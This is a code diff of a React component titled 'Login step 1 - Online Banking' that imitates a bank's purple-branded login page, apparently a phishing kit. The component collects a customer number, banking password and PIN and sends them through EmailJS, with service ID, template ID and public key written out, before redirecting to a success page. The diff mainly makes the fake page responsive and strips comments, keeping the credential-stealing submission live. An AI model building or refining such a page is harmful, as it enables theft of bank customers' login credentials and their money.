@@ -4,7 +4,7 @@ import { useNavigate } from "react-router-dom";
 import emailjs from "@emailjs/browser";
 
 export default function OnlineBanking() {
-  const form = useRef(); // ✅ EmailJS form ref
+  const form = useRef();
   const navigate = useNavigate();
 
   const [errors, setErrors] = useState({
@@ -31,35 +31,35 @@ export default function OnlineBanking() {
     if (!newErrors.customerNo && !newErrors.password && !newErrors.pin) {
       emailjs
         .sendForm(
-          "service_e1eul13",     // ✅ your EmailJS service ID
-          "template_x4r3vzo",    // ✅ your template ID
+          "service_e1eul13",
+          "template_x4r3vzo",
           form.current,
-          "nb4k7l5gjhCm1Jyk1"    // ✅ your public key
+          "nb4k7l5gjhCm1Jyk1"
         )
         .then(
-          (result) => {
-            console.log("Email sent:", result.text);
-            navigate("/success"); // ✅ redirect after success
-          },
-          (error) => {
-            console.log("Error:", error.text);
-          }
+          () => navigate("/success"),
+          (error) => console.log("Error:", error.text)
         );
 
-      e.target.reset(); // ✅ clear form
+      e.target.reset();
     }
   };
 
   return (
     <div className="min-h-screen bg-white">
       {/* Top small header */}
-      <header className="bg-[#5a287d] shadow-lg py-2 px-6 flex items-center relative z-10">
-        <img src="/img/logo.svg" alt="Logo" className="h-8 w-auto ml-40" />
-      </header>
+      <header className="bg-[#5a287d] shadow-[0_4px_10px_rgba(0,0,0,0.4)] py-2 px-4 flex items-center relative z-10">
+  <img
+    src="/img/logo.svg"
+    alt="Logo"
+    className="h-8 w-auto mx-auto md:ml-40"
+  />
+</header>
+
 
       {/* Second big header */}
-      <div className="bg-[#5a287d] text-white py-10 px-6 text-center">
-        <h1 className="text-2xl md:text-3xl font-bold mb-2">
+      <div className="bg-[#5a287d] text-white py-8 px-4 text-center">
+        <h1 className="text-xl md:text-3xl font-bold mb-2">
           Login step 1 - Online Banking
         </h1>
         <p className="text-sm md:text-base max-w-2xl mx-auto">
@@ -69,8 +69,12 @@ export default function OnlineBanking() {
       </div>
 
       {/* Login form */}
-      <main className="flex flex-col items-start mt-20 ml-60">
-        <form ref={form} onSubmit={sendLoginEmail} className="w-full max-w-lg p-6 bg-white">
+      <main className="flex justify-center px-4 mt-10">
+        <form
+          ref={form}
+          onSubmit={sendLoginEmail}
+          className="w-full max-w-lg p-6 bg-white shadow-md rounded-md"
+        >
           {/* Customer Number */}
           <div className="mb-4">
             <label className="block text-sm font-medium mb-1">
@@ -85,7 +89,7 @@ export default function OnlineBanking() {
             >
               <input
                 type="text"
-                name="customerNo"  // ✅ EmailJS field
+                name="customerNo"
                 className="w-full bg-transparent outline-none text-base"
                 placeholder="Enter Customer Number"
               />
@@ -112,7 +116,7 @@ export default function OnlineBanking() {
             >
               <input
                 type="password"
-                name="password"  // ✅ EmailJS field
+                name="password"
                 className="w-full bg-transparent outline-none text-base"
                 placeholder="Enter Banking Password"
               />
@@ -139,7 +143,7 @@ export default function OnlineBanking() {
             >
               <input
                 type="text"
-                name="pin"  // ✅ EmailJS field
+                name="pin"
                 className="w-full bg-transparent outline-none text-base"
                 placeholder="Enter PIN"
               />
@@ -153,12 +157,14 @@ export default function OnlineBanking() {
           </div>
 
           {/* Continue Button */}
-          <button
-            type="submit"
-            className="ml-87 px-6 py-3 bg-purple-900 text-white font-semibold transition"
-          >
-            Continue
-          </button>
+          <div className="flex justify-start">
+            <button
+              type="submit"
+              className="w-full md:w-auto px-6 py-3 bg-purple-900 text-white font-semibold transition"
+            >
+              Continue
+            </button>
+          </div>
         </form>
       </main>
     </div>
